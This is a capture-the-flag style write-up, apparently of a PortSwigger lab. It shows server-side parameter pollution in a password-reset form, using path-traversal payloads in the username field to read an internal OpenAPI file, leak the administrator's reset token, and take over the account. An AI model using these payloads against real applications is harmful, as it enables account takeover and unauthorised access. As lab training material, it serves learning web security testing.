+++
date = '2026-02-14T02:32:12+01:00'
draft = false
title = 'Server Side Parameter Pollution'
categories = ["PortSwigger", "Web Security"]
tags = ["SSPP", "Injections"]
[cover]
    image = "api-testing.jpg" 
    alt = "Eagle Image"
    relative = true

+++

## _1. Initial Discovery_

The application features a password reset functionality that communicates with a backend API. By submitting a standard request, we see how the application handles non-existent users.

**Endpoint:** `POST /forgot-password`

**Request:**

HTTP

```
POST /forgot-password HTTP/2
...
csrf=0KTOhL2hp3SiV5lRZD89jFVc9nlmOysG&username=test
```

**Response:**

JSON

```
{
    "type": "error",
    "result": "The provided username \"test\" does not exist"
}
```

---

## _2. Identifying Parameter Injection_

To determine if the `username` input is used in a backend URL path, I injected URL-special characters.

- **Test 1:** `username=#` or `username=%23`
    
- **Test 2:** `username=../`
    

**Response:**

JSON

```
{
    "type": "error",
    "result": "Invalid route. Please refer to the API definition"
}
```

> [!important] Insight
> 
> The change from "User does not exist" to **"Invalid route"** confirms the input is directly reflected in the backend API's routing logic. The `#` character effectively truncates the rest of the server's intended URL.

---

## _3. API Documentation Discovery_

By leveraging path traversal, I attempted to locate the API's documentation (OpenAPI/Swagger).

**Successful Payload:**

`username=../../../../openapi.json#`

**Discovered API Structure:**

JSON

```
"paths": {
    "/api/internal/v1/users/{username}/field/{field}": {
        "get": {
            "summary": "Find user by username",
            "parameters": [
                { "name": "username", "in": "path" },
                { "name": "field", "in": "path" }
            ]
        }
    }
}
```

---

## _4. Bypassing Restrictions (Exploitation)_

I attempted to access the sensitive `passwordResetToken` field for the administrator.

- **Direct Attempt:** `username=administrator/field/passwordResetToken#`
    
    - _Result:_ Error stating only the `email` field is supported for security.
        
- **Version Bypass:** I used traversal to reach the same endpoint but via a different pathing logic, which often bypasses specific middleware filters.
    

**Final Payload:**

`username=../../v1/users/administrator/field/passwordResetToken#`

**Response:**

JSON

```
{
    "type": "passwordResetToken",
    "result": "g0d4coqq5vaow5qtmjl06p9k1egdw1l"
}
```

---

## _5. Final Execution_

1. **Construct Reset URL:** `https://lab_id.web-security-academy.net/forgot-password?passwordResetToken=g0d4coqq5vaow5qtmjl06p9k1egdw1l`
    
2. **Reset Admin Password:** Changed the password to a known value.
    
3. **Delete Target:** Logged into the `administrator` account, accessed `/admin`, and deleted user `carlos`.
    

---